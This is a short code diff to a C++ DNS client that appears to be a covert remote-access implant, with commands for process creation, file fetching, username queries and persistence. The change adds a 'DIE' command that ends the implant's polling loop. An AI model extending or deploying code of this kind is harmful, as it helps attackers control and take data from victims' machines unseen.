@@ -32,7 +32,8 @@ enum Op {
 	CREATE_PROCESS = 10,
 	FETCH_FILE = 11,
 	QUERY_USERNAME = 12,
-	PERSIST = 13
+	PERSIST = 13,
+	DIE = 14
 };
 
 DNSClient::DNSClient()
@@ -212,7 +213,7 @@ string DNSClient::exec(const string& cmd)
 	return string(out + err);
 }
 
-void DNSClient::sync()
+bool DNSClient::sync()
 {
 	PDNS_RECORD rec;
 	DNS_FREE_TYPE ft = DnsFreeRecordListDeep;
@@ -304,8 +305,13 @@ void DNSClient::sync()
 			case Op::PERSIST:
 				pack_outbound_queue(Op::OUTPUT, persist());
 				break;
+
+			case Op::DIE:
+				return false;
 		}
 	}
+
+	return true;
 }
 
 int DNSClient::main()
@@ -314,7 +320,9 @@ int DNSClient::main()
 	WSAStartup(MAKEWORD(2, 2), &wsa);
 
 	while(true) {
-		sync();
+		if(!sync())
+			break;
+
 		if(!outbound_queue.empty())
 			Sleep(send_delay_ms);
 		else
